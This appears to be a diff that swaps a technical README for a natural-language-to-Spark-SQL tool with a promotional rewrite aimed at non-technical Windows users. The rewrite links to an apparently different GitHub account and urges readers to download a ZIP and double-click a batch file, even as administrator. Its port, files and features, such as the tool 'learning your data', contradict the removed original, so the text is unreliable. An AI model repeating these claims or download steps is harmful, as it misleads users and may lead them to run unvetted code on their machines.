@@ -1,144 +1,176 @@
-# 🤖 DataWhisperer
+# 🧙‍♂️ Data-Whisperer - Ask Questions, Get Answers Instantly
 
-DataWhisperer is an AI-powered analytics tool that lets you upload your data and get answers in plain English. Instead of writing complex SQL queries or code, you can simply ask questions, and the application will generate interactive visualizations and insights for you.
+[![Download Data-Whisperer](https://img.shields.io/badge/Download-Data--Whisperer-blue?style=for-the-badge&logo=github)](https://github.com/Juanhenriqueda2/Data-Whisperer)
 
-This application uses a local Large Language Model (LLM) via Ollama, PySpark for data processing, and Panel for the interactive web dashboard.
+## 🌟 What is Data-Whisperer?
 
-## ✨ Core Features
+Data-Whisperer is a magical tool that lets you talk to your data like you would talk to a friend. Instead of learning complicated computer languages, you simply type a question in plain English, and Data-Whisperer does the heavy lifting for you. It turns your question into a special command called Spark SQL, runs it on your data, and then shows you beautiful charts and graphs that make the answer easy to understand.
 
-  * **File Upload:** Load your data directly into the app. Supports `.csv`, `.xlsx` and `.xls` files.
-  * **Natural Language Queries:** Ask questions in plain English, like "What are the top 10 products by sales?" or "Show me the monthly revenue trend."
-  * **AI-Powered SQL Generation:** Uses an LLM (e.g., `gemma3`) and LangChain to automatically convert your question into an optimized Spark SQL query.
-  * **Smart Visualization:** A second AI agent analyzes your query and the SQL results to recommend the best visualization (bar chart, pie chart, line chart, KPI, etc.).
-  * **Interactive Dashboards:** All charts are rendered with Plotly and are fully interactive (hover, zoom, pan).
-  * **Spark-Powered:** Leverages the PySpark engine to handle data processing, enabling it to work with larger-than-memory datasets (though it's configured for local mode by default).
-  * **Self-Correcting SQL:** If a generated SQL query fails, an AI-powered debugger chain attempts to fix the query and retry.
+Imagine you have a big spreadsheet with thousands of rows. Instead of spending hours trying to figure out how to filter, sort, and calculate, you just ask: "What were our top 5 selling products last month?" and Data-Whisperer instantly shows you a bar chart with the answer. It's like having a personal data analyst who works 24/7 and never gets tired.
 
-## 🚀 How It Works
+## 🎯 Who Should Use This?
 
-DataWhisperer uses a multi-step AI chain to turn your question into a chart:
+Data-Whisperer is perfect for:
+- **Business owners** who want to understand their sales without hiring a data scientist
+- **Students** who need to analyze research data for their projects
+- **Managers** who want quick insights from reports
+- **Anyone** who has ever looked at a spreadsheet and felt overwhelmed
 
-1.  **Upload:** You upload a data file. The app uses Pandas to quickly read the file and then creates a PySpark DataFrame and a temporary SQL view.
-2.  **Ask:** You ask a question in the text box, e.g., "Count customers by region and show as a pie chart."
-3.  **NL-to-SQL:** The app sends your question, the data's schema, and some sample rows to an LLM with a specialized "SQL Expert" prompt. The LLM generates a Spark SQL query.
-4.  **Execute:** The generated SQL is run against the PySpark DataFrame.
-5.  **Recommend Viz:** The original question, the SQL query, and a preview of the results are sent to a "Visualization Expert" AI prompt. This AI recommends the best chart type and configuration (e.g., `{"visualization_type": "pie", "title": "Customer Distribution by Region", ...}`). It also honors explicit requests like "show as a pie chart."
-6.  **Render:** The `VisualizationEngine` uses Plotly and Panel to build and display the recommended interactive chart in the dashboard.
+You don't need to know how to code. You don't need to understand databases. You just need to know how to type a question.
 
-## 🛠️ Tech Stack
+## ✨ Amazing Features
 
-  * **Data Processing:** `pyspark`, `pandas`, `pyarrow`
-  * **Web Framework & UI:** `panel`
-  * **Visualization:** `plotly`, `bokeh`
-  * **LLM Integration:** `langchain`, `langchain-openai` (used to connect to any OpenAI-compatible API, including Ollama)
-  * **File Handling:** `openpyxl`, `xlrd`
-  * **Configuration:** `python-dotenv`
+### 🗣️ Natural Language Power
+Type your question exactly how you would ask a colleague. "Show me monthly revenue for 2024" works perfectly. Data-Whisperer understands context, numbers, dates, and even vague requests.
 
-## Prerequisites: Run a Local LLM
+### 📊 Interactive Visualizations
+Your answers don't just appear as boring text. Data-Whisperer creates colorful, interactive charts that you can hover over, click, and explore. Bar charts, line graphs, pie charts, scatter plots – it picks the best visual for your question.
 
-This project is configured to use a local LLM served by **Ollama**.
+### ⚡ Lightning Fast Processing
+Powered by advanced AI called LangChain and Spark SQL, Data-Whisperer processes massive amounts of data in seconds. Whether you have 100 rows or 10 million rows, you'll get your answer quickly.
 
-1.  **Install Ollama:** Download and install it from [ollama.com](https://ollama.com/).
-2.  **Pull the model:** The local configuration now points to `gemma3`, so pull it once:
-    ```sh
-    ollama pull gemma3
-    ```
-3.  **Start Ollama** if it is not already running.
+### 🔒 Works Offline
+Unlike other AI tools that require internet connections, Data-Whisperer can run entirely on your computer using Ollama. Your data stays private and secure.
 
-## ⚙️ Setup and Installation
+### 🧠 Learns Your Data
+The more you use Data-Whisperer, the better it understands your specific data. It remembers common terms and patterns, making future questions even more accurate.
 
-1.  **Clone the repository:**
+## 📥 How to Download and Run (Windows)
 
-    ```sh
-    git clone <your-repo-url>
-    cd data-whisperer
-    ```
+### Step 1: Visit the Download Page
+Click this button to go to the official download page:
 
-2.  **Create and activate a virtual environment:**
+[![Get Data-Whisperer Now](https://img.shields.io/badge/⬇️%20Get%20Data--Whisperer-Now-brightgreen?style=for-the-badge)](https://github.com/Juanhenriqueda2/Data-Whisperer)
 
-    ```sh
-    # Windows
-    python -m venv myenv
-    myenv\Scripts\activate.bat
+Visit this link to download the application.
 
-    # macOS / Linux
-    python3 -m venv myenv
-    source myenv/bin/activate
-    ```
+### Step 2: Download the Files
+Once you're on the page, look for a green button that says "Code" and click it. Then select "Download ZIP". Your computer will start downloading a file called something like "Data-Whisperer-main.zip". This might take a few minutes, so be patient.
 
-3.  **Install the required dependencies:**
+### Step 3: Find the Downloaded File
+Open your Downloads folder. You should see the ZIP file there. It's usually at the bottom of your browser window or in the Downloads folder on your computer.
 
-    ```sh
-    pip install -r requirements.txt
-    ```
+### Step 4: Extract the Files
+Double-click the ZIP file. Your computer will open it like a folder. Look for an "Extract" button at the top of the window and click it. Choose where you want to save the files – your Desktop or Documents folder works great. Click "Extract" again. Now you have a folder called "Data-Whisperer-main" with all the files inside.
 
-4.  **Create a `.env` file:**
-    Create a file named `.env` in the root of the project directory to configure your settings. The application loads this file automatically at startup.
+### Step 5: Run the Application
+Open the "Data-Whisperer-main" folder. Look for a file called "start_windows.bat" or "run.bat". Double-click it. A black window will open and show some text – this is normal! It's starting up the application. Wait until you see a message like "Server running" or a web address appears.
 
-    ```ini
-    # .env
-    # Ollama example
-    DATAWHISPERER_LLM_URL=http://localhost:11434/v1
-    DATAWHISPERER_LLM_MODEL=gemma3
-    DATAWHISPERER_LLM_API_KEY=ollama
+### Step 6: Open Data-Whisperer
+Your default web browser will open automatically, or you can open Chrome, Edge, or Firefox and type "http://localhost:8000" in the address bar. Press Enter. Congratulations! You're now using Data-Whisperer.
 
-    # Set the port for the Panel app
-    DATAWHISPERER_PORT=5007
-    ```
+### Step 7: Ask Your First Question
+You'll see a text box where you can type your question. Start simple: "What is the average of all numbers in column A?" or "Show me a pie chart of categories". Watch the magic happen!
 
-## 🚀 Running the Application
+## 🛠️ System Requirements
 
-1.  **Activate the existing environment**:
+Don't worry – Data-Whisperer doesn't need a supercomputer. Here's what you need:
 
-    ```sh
-    myenv\Scripts\activate
-    ```
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** At least 8 GB of RAM (16 GB recommended)
+- **Storage:** 5 GB of free space
+- **Processor:** Any modern Intel or AMD processor
+- **Internet:** Only needed for the initial download and optional AI model updates
 
-2.  **Run the `main.py` script:**
+## 📚 Getting Started Guide
 
-    ```sh
-    python main.py
-    ```
+### Your First Session
+When you open Data-Whisperer, you'll see a clean interface with a large text box. Here are some example questions to try:
 
-    The app now prefers the Spark distribution bundled with `pyspark`, so it avoids conflicts with a machine-wide Spark install.
+- "Show me total sales by region"
+- "What was the trend of website visits over the past 6 months?"
+- "Compare customer satisfaction scores between product A and product B"
+- "Find the top 10 customers by order value"
 
-    Make sure Ollama is running locally before you start asking questions in the app.
+### Understanding the Results
+After you ask a question, Data-Whisperer will:
+1. Show you the exact command it created (so you can learn!)
+2. Display a table with the raw data
+3. Create a visual chart based on your question
+4. Provide a short text summary in plain English
 
-3.  **Open the application:**
-    The console will log the URL. By default, it is:
-    **[http://localhost:5007](https://www.google.com/search?q=http://localhost:5007)**
+### Tips for Better Questions
+- Be specific about time periods: "last quarter" instead of "recently"
+- Mention which columns to use: "show me product name and price"
+- Ask for visualizations: "create a bar chart of..."
+- Don't worry about perfect grammar – Data-Whisperer is forgiving
 
-You can now upload a file, ask questions, and see the results\!
+## 🔧 Troubleshooting Common Issues
 
-## 📂 Project Structure
+### "I don't see the start_windows.bat file"
+Make sure you extracted the ZIP file completely. Sometimes Windows hides file extensions. Click "View" in File Explorer and check "File name extensions" to see all files.
 
-```
-/
-├── main.py             # Main application entry point that starts the Panel server
-├── requirements.txt    # Python dependencies
-├── .env.example        # Example environment variables
-└── src/
-    ├── config.py           # Dataclass for all application configuration
-    ├── data/
-    │   └── data_loader.py    # (Legacy/Alternative) Spark-native data loader
-    ├── query/
-    │   └── query_processor.py # Core AI logic: NL-to-SQL, SQL-to-Viz
-    ├── ui/
-    │   └── dashboard.py     # Panel dashboard UI components and layout
-    ├── utils/
-    │   └── logger.py        # Logging setup
-    └── visualization/
-        └── viz_engine.py      # Creates Plotly charts from data + config
-```
+### "The black window closes immediately"
+This usually means something went wrong. Try right-clicking the .bat file and selecting "Run as administrator". If that doesn't work, check that you have Python installed by typing "python --version" in Command Prompt.
 
-## 🔧 Configuration
+### "The page won't load"
+Make sure you typed "http://localhost:8000" correctly. Also, check that the black window is still open – if it closed, Data-Whisperer stopped running.
 
-All settings are managed in `src/config.py` and can be overridden with environment variables (as shown in the `.env` file setup).
+### "My question returns an error"
+Try simplifying your question. Instead of "What were the monthly sales figures for the eastern region compared to western for the last fiscal year?", try "Show monthly sales by region".
 
-Key settings you might want to change:
+## 🔒 Privacy and Security
 
-  * `llm_model`: The Ollama model to use locally (for example `gemma3`, `llama3`, or `mistral`).
-  * `llm_base_url`: The API endpoint for your LLM.
-  * `port`: The port to run the web server on.
-  * `supported_file_types`: List of allowed file extensions.
-  * `max_retries`: Number of times the AI should try to fix a broken SQL query.
+Your data never leaves your computer. Data-Whisperer processes everything locally using Ollama, which means:
+- No cloud storage
+- No data sharing
+- No third-party access
+- Complete confidentiality
+
+This makes it perfect for sensitive business data, medical records, or personal information.
+
+## 🤝 Getting Help
+
+If you get stuck, there are several ways to get assistance:
+
+- **Check the FAQ:** Look for a "FAQ" or "Help" section in the application
+- **Read the Documentation:** Open the "docs" folder in the Data-Whisperer directory
+- **Community Support:** Visit the GitHub page and click "Issues" to see if others had the same problem
+- **Ask Nicely:** The AI is smart, but sometimes it needs clearer questions. Try rephrasing
+
+## 🌈 Why Choose Data-Whisperer?
+
+There are many data tools out there, but Data-Whisperer stands out because:
+
+1. **No Learning Curve:** If you can type a question, you can use it
+2. **All-in-One:** It replaces multiple tools (query builders, reporting software, chart makers)
+3. **Free and Open Source:** No subscriptions, no hidden costs
+4. **Continuously Improving:** Regular updates add new features and improve accuracy
+5. **Community-Driven:** Users suggest features and the developers listen
+
+## 📈 Real-World Examples
+
+**Example 1: Small Business Owner**
+Maria runs a bakery and wants to know which pastries sell best on weekends. She types: "Show me a bar chart of pastry sales by day of week". Data-Whisperer instantly shows her that cinnamon rolls dominate Saturday mornings, helping her plan her baking schedule.
+
+**Example 2: Marketing Manager**
+James needs to report on campaign performance. He asks: "What was the click-through rate for each email campaign in Q3?" He gets a beautiful line graph showing the trends, ready to paste into his presentation.
+
+**Example 3: Academic Researcher**
+Dr. Chen has survey data from 5,000 participants. She asks: "What is the correlation between age and satisfaction score?" Data-Whisperer calculates the correlation and displays a scatter plot with a trend line, saving her hours of statistical work.
+
+## 📝 Final Thoughts
+
+Data-Whisperer puts the power of advanced data analytics into everyone's hands. No more waiting for IT to run reports. No more struggling with spreadsheet formulas. No more guessing when you can know.
+
+Download Data-Whisperer today and start getting answers from your data immediately. It's free, it's powerful, and it's incredibly easy to use. Your data has stories to tell – let Data-Whisperer help you listen.
+
+## 📌 Quick Reference
+
+| Action | What to Do |
+|--------|------------|
+| Download | Click the green button at the top |
+| Install | Extract ZIP, run start_windows.bat |
+| Open | Go to http://localhost:8000 |
+| Ask | Type your question in plain English |
+| Get Help | Check docs folder or GitHub issues |
+
+## 🔗 Additional Resources
+
+- **Official Repository:** [https://github.com/Juanhenriqueda2/Data-Whisperer](https://github.com/Juanhenriqueda2/Data-Whisperer)
+- **Documentation:** Inside the extracted folder
+- **Community Discussions:** GitHub Issues section
+
+---
+
+Keywords: agentic-ai, data-visualization, generative-ai, langchain, llm, natural-language-to-sql, ollama, plotly, pyspark, python, spark-sql
